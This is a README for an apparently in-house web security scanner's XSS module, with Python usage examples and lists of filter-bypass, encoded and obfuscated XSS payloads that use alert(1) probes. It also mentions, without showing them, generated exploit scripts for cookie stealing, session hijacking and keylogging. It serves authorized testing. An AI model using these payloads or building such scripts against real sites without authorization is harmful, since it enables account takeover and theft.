# XSS (Cross-Site Scripting) Module

## Overview

The XSS module provides automated testing for Cross-Site Scripting vulnerabilities with comprehensive filter bypass techniques. It supports reflected, stored, and DOM-based XSS detection using multiple encoding schemes, obfuscation techniques, and non-standard HTML tags and event handlers.

## Features

- **Multiple XSS Types**: Reflected, Stored, and DOM-based XSS detection
- **Encoding Techniques**: HTML entity, URL, double URL, Unicode encoding
- **Obfuscation**: Case variation, null bytes, comments, string concatenation
- **Filter Bypass**: Keyword filters, space filters, quote filters, parentheses filters
- **Non-Standard Tags**: Marquee, details, video, audio, embed, object, math, svg
- **Event Handlers**: 25+ event handlers including onload, onerror, onfocus, ontoggle
- **PoC Generation**: Automatic proof-of-concept HTML and JavaScript generation

## Usage

### Basic XSS Testing

```python
from app.modules.xss import XSSTester, InjectionPoint
from app.core.request_handler import RequestHandler

# Initialize
request_handler = RequestHandler()
xss_tester = XSSTester(request_handler)

# Define injection point
injection_point = InjectionPoint(
    parameter="search",
    location="query",
    original_value="test",
    url="https://example.com/search?q=test",
    method="GET"
)

# Test for XSS
results = await xss_tester.test_injection_point(injection_point)

# Check results
for result in results:
    if result.is_vulnerable:
        print(f"XSS found: {result.xss_type.value}")
        print(f"Payload: {result.payload}")
        print(f"Confidence: {result.confidence}")
        print(f"PoC HTML: {result.poc_html}")
```

### Testing Specific Techniques

```python
from app.modules.xss import XSSTechnique

# Test only filter bypass techniques
results = await xss_tester.test_injection_point(
    injection_point,
    techniques=[XSSTechnique.FILTER_BYPASS, XSSTechnique.ENCODED]
)
```

### POST Parameter Testing

```python
# Test POST parameter
injection_point = InjectionPoint(
    parameter="comment",
    location="post",
    original_value="",
    url="https://example.com/comment",
    method="POST",
    data={"comment": "", "user": "test"}
)

results = await xss_tester.test_injection_point(injection_point)
```

### Generating Exploit Scripts

```python
from app.modules.xss import XSSPoCGenerator

poc_generator = XSSPoCGenerator()

# Generate PoC HTML
poc_html = poc_generator.generate_poc(
    injection_point,
    payload="<script>alert(1)</script>",
    xss_type=XSSType.REFLECTED
)

# Generate exploit JavaScript
exploit_js = poc_generator.generate_exploit_script(
    injection_point,
    payload="<script>alert(1)</script>",
    xss_type=XSSType.REFLECTED
)
```

## Payload Categories

### Basic Payloads
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<iframe src=javascript:alert(1)>`

### Non-Standard Tags
- `<marquee onstart=alert(1)>`
- `<details open ontoggle=alert(1)>`
- `<video src=x onerror=alert(1)>`
- `<math><mi xlink:href=javascript:alert(1)>X</mi>`

### Encoded Payloads
- HTML entity: `&#60;script&#62;alert(1)&#60;/script&#62;`
- URL encoded: `%3Cscript%3Ealert(1)%3C/script%3E`
- Double URL: `%253Cscript%253Ealert(1)%253C/script%253E`
- Unicode: `\\u003cscript\\u003ealert(1)\\u003c/script\\u003e`

### Filter Bypass
- Keyword bypass: `<scr<script>ipt>alert(1)</scr</script>ipt>`
- Space bypass: `<img/src=x/onerror=alert(1)>`
- Quote bypass: `<img src=x onerror=alert(1)>`
- Parentheses bypass: `<svg onload=alert\`1\`>`

### Obfuscation
- Case variation: `<ScRiPt>alert(1)</sCrIpT>`
- Comments: `<scr<!--comment-->ipt>alert(1)</scr<!---->ipt>`
- String concat: `<script>alert(String.fromCharCode(88,83,83))</script>`
- Template literals: `<script>alert\`1\`</script>`

## XSS Detection

The module detects XSS by:

1. **Payload Reflection**: Checking if payload appears unescaped in response
2. **Context Analysis**: Determining if payload is in dangerous context (script tag, event handler, etc.)
3. **Indicator Matching**: Looking for XSS indicators like `<script>`, `onerror=`, `javascript:`
4. **Baseline Comparison**: Comparing response with baseline to identify new content

## PoC Generation

The module automatically generates:

1. **HTML PoC**: Complete HTML page with automatic and manual trigger options
2. **Exploit Scripts**: JavaScript code for cookie stealing, session hijacking, keylogging, phishing

## Requirements Validation

This module validates:

- **Requirement 13.1**: Inject payloads using multiple encoding schemes and obfuscation techniques
- **Requirement 13.2**: Test DOM-based XSS payloads
- **Requirement 13.3**: Test non-standard HTML tags and event handlers
- **Requirement 13.4**: Capture successful payloads
- **Requirement 13.5**: Verify payload appears in response without proper sanitization

## Testing

Run tests with:

```bash
pytest backend/tests/test_xss.py -v
```

## Security Notice

This module is designed for:
- Educational purposes
- Authorized CTF competitions
- Legal bug bounty programs
- Controlled vulnerable-by-design platforms

**Never use this module against systems without explicit authorization.**
